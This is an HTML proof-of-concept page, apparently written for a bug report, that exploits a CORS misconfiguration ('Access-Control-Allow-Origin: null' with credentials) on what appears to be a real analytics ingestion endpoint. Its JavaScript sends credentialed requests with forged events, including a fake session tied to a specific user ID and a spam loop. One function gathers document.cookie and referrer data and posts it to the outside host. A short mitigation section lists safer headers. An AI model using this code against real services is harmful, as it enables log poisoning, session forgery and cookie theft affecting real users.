<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Logging Vulnerability PoC</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            padding: 20px;
            line-height: 1.6;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            color: #ff4444;
            margin-bottom: 30px;
        }
        .section {
            background: #1a1a1a;
            border: 1px solid #333;
            padding: 20px;
            margin: 20px 0;
            border-radius: 5px;
        }
        .vulnerable-config {
            color: #ff6666;
            background: #2a1a1a;
            padding: 10px;
            border-left: 4px solid #ff4444;
            margin: 15px 0;
        }
        .exploit-btn {
            background: #ff4444;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            margin: 10px 5px;
            font-family: inherit;
        }
        .exploit-btn:hover {
            background: #ff6666;
        }
        .safe-btn {
            background: #44aa44;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            margin: 10px 5px;
            font-family: inherit;
        }
        .safe-btn:hover {
            background: #66bb66;
        }
        .results {
            background: #000;
            color: #00ff00;
            padding: 15px;
            border-radius: 5px;
            font-family: monospace;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
            margin: 15px 0;
        }
        .warning {
            color: #ffaa00;
            background: #2a2a1a;
            padding: 15px;
            border: 1px solid #ffaa00;
            border-radius: 5px;
            margin: 15px 0;
        }
        .code-block {
            background: #111;
            color: #ccc;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 10px 0;
            border: 1px solid #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üö® CORS Logging Vulnerability PoC üö®</h1>
            <p>Demonstrating Cross-Origin Request Abuse</p>
        </div>

        <div class="section">
            <h2>üîç Vulnerability Analysis</h2>
            <div class="vulnerable-config">
                <strong>Vulnerable Configuration:</strong><br>
                Access-Control-Allow-Origin: null<br>
                Access-Control-Allow-Credentials: true
            </div>
            <p>This configuration allows requests from:</p>
            <ul>
                <li>üî• data: URIs (like this PoC)</li>
                <li>üî• file:// URLs</li>
                <li>üî• Sandboxed iframes</li>
                <li>üî• Any null-origin context</li>
            </ul>
        </div>

        <div class="section">
            <h2>‚ö†Ô∏è Attack Scenarios</h2>
            <div class="warning">
                <strong>What an attacker could do:</strong>
                <ul>
                    <li>üìä Pollute your analytics with fake session data</li>
                    <li>üïµÔ∏è Extract user IDs and session information</li>
                    <li>üîÑ Perform session replay attacks</li>
                    <li>üìà Skew business metrics and reports</li>
                    <li>üéØ Profile users across different sites</li>
                </ul>
            </div>
        </div>

        <div class="section">
            <h2>üéØ Exploit Demonstrations</h2>
            
            <button class="exploit-btn" onclick="basicLogPollution()">
                1. Basic Log Pollution
            </button>
            
            <button class="exploit-btn" onclick="fakeSessionInjection()">
                2. Fake Session Injection
            </button>
            
            <button class="exploit-btn" onclick="dataExfiltrationSim()">
                3. Data Exfiltration Sim
            </button>
            
            <button class="exploit-btn" onclick="massSpamAttack()">
                4. Mass Spam Attack
            </button>

            <button class="safe-btn" onclick="clearResults()">
                Clear Results
            </button>
        </div>

        <div class="section">
            <h2>üìã Attack Results</h2>
            <div id="results" class="results">Ready to demonstrate attacks...\n</div>
        </div>

        <div class="section">
            <h2>üõ°Ô∏è Mitigation Strategies</h2>
            <div class="code-block">
# Instead of dangerous config:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Use secure alternatives:
Access-Control-Allow-Origin: https://yourdomain.com
# OR for public logging (no credentials needed):
Access-Control-Allow-Origin: *
# Remove credentials if not needed:
# Access-Control-Allow-Credentials: false
            </div>
        </div>

        <div class="section">
            <h2>üìù Sample Malicious Payloads</h2>
            <div id="payload-examples" class="code-block">
// Basic pollution
{"user_id":"FAKE_USER","kind":"session_end","event_name":"MALICIOUS_EVENT"}

// Session hijacking attempt  
{"user_id":"2786199722","kind":"session_start","session_id":"HIJACKED_SESSION"}

// Data exfiltration marker
{"user_id":"EXTRACTED_" + document.cookie,"kind":"data_theft","event_name":"cookie_theft"}
            </div>
        </div>
    </div>

    <script>
        const TARGET_URL = 'https://in.grammarly.com/v1/events/ingestion_front_end?datasetName=session_end';
        const results = document.getElementById('results');
        
        function log(message, type = 'info') {
            const timestamp = new Date().toISOString();
            const prefix = type === 'success' ? '‚úÖ' : type === 'error' ? '‚ùå' : '‚ÑπÔ∏è';
            results.textContent += `[${timestamp}] ${prefix} ${message}\n`;
            results.scrollTop = results.scrollHeight;
        }

        function clearResults() {
            results.textContent = 'Results cleared...\n';
        }

        async function makeRequest(payload, description) {
            log(`üöÄ Launching: ${description}`);
            
            try {
                // Note: Replace with actual target URL for real testing
                const response = await fetch(TARGET_URL, {
                    method: 'POST',
                    credentials: 'include', // This is the dangerous part!
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                const responseText = await response.text();
                log(`Response Status: ${response.status}`, 'success');
                log(`Response Body: "${responseText}"`, 'success');
                log(`‚úì Attack payload successfully sent!`, 'success');
                
            } catch (error) {
                log(`Connection failed: ${error.message}`, 'error');
                log(`Note: Replace TARGET_URL with actual endpoint for real test`, 'info');
            }
            log('‚îÄ'.repeat(50));
        }

        async function basicLogPollution() {
            const maliciousPayload = {
                "client": "MALICIOUS_CLIENT",
                "client_version": "HACKED",
                "device": {
                    "system_name": "ATTACK_SYSTEM",
                    "browser_name": "EVIL_BROWSER",
                    "user_agent": "ATTACKER_AGENT"
                },
                "user_id": "FAKE_USER_12345",
                "kind": "session_end",
                "session_id": "MALICIOUS_SESSION",
                "integration_id": "FAKE_INTEGRATION",
                "session_duration": 999999,
                "client_event_epoch": Date.now(),
                "nonce": 666666666,
                "event_name": "POLLUTION_ATTACK"
            };
            
            await makeRequest(maliciousPayload, "Basic Log Pollution Attack");
        }

        async function fakeSessionInjection() {
            const sessionHijackPayload = {
                "client": "aiEditor",
                "client_version": "7b5248e88e82",
                "device": {
                    "system_name": "linux",
                    "system_version": "",
                    "browser_name": "firefox",
                    "browser_version": "128",
                    "user_agent": "Mozilla/5.0 (SPOOFED) AttackerBot/1.0"
                },
                "user_id": "2786199722", // Using real user ID!
                "kind": "session_start", // Fake session start
                "session_id": "HIJACKED_SESSION_ID",
                "integration_id": "39b850e1-0590-4302-832b-c330338233de",
                "session_duration": 0,
                "client_event_epoch": Date.now(),
                "nonce": Math.floor(Math.random() * 9999999999),
                "event_name": "FAKE_SESSION_START"
            };
            
            await makeRequest(sessionHijackPayload, "Fake Session Injection");
        }

        async function dataExfiltrationSim() {
            // Simulating data that might be extracted
            const extractedData = {
                cookies: document.cookie || "no_cookies_found",
                referrer: document.referrer || "direct",
                userAgent: navigator.userAgent,
                timestamp: Date.now()
            };
            
            const exfilPayload = {
                "client": "DATA_EXFIL",
                "client_version": "STEAL_V1.0",
                "device": {
                    "system_name": "COMPROMISED",
                    "browser_name": "DATA_THIEF",
                    "user_agent": navigator.userAgent
                },
                "user_id": `STOLEN_DATA_${btoa(JSON.stringify(extractedData))}`,
                "kind": "data_theft",
                "session_id": "EXFILTRATION_SESSION",
                "integration_id": "EVIL_INTEGRATION",
                "session_duration": -1,
                "client_event_epoch": Date.now(),
                "nonce": 1337,
                "event_name": "DATA_EXFILTRATION_ATTEMPT",
                "stolen_data": extractedData
            };
            
            await makeRequest(exfilPayload, "Data Exfiltration Simulation");
        }

        async function massSpamAttack() {
            log("üî• Launching mass spam attack (5 rapid requests)...");
            
            const promises = [];
            for (let i = 0; i < 5; i++) {
                const spamPayload = {
                    "client": `SPAM_CLIENT_${i}`,
                    "client_version": "SPAM_V1.0",
                    "device": {
                        "system_name": "SPAM_SYSTEM",
                        "browser_name": "SPAM_BOT",
                        "user_agent": "SpamBot/1.0 (Malicious)"
                    },
                    "user_id": `SPAM_USER_${i}`,
                    "kind": "spam_event",
                    "session_id": `SPAM_SESSION_${i}`,
                    "integration_id": `SPAM_INTEGRATION_${i}`,
                    "session_duration": i * 1000,
                    "client_event_epoch": Date.now() + i,
                    "nonce": 999999999 + i,
                    "event_name": `SPAM_ATTACK_${i}`
                };
                
                promises.push(makeRequest(spamPayload, `Spam Attack #${i + 1}`));
            }
            
            try {
                await Promise.all(promises);
                log("üí• Mass spam attack completed!", 'success');
            } catch (error) {
                log(`Spam attack failed: ${error.message}`, 'error');
            }
        }

        // Initialize
        log("üé≠ CORS Logging Vulnerability PoC Ready");
        log("‚ö†Ô∏è  This demonstrates how ACAO:null + ACAC:true can be exploited");
        log("üéØ Click buttons above to see different attack scenarios");
        log("üìù Replace TARGET_URL with real endpoint for actual testing");
        log('‚ïê'.repeat(50));
    </script>
</body>
</html>
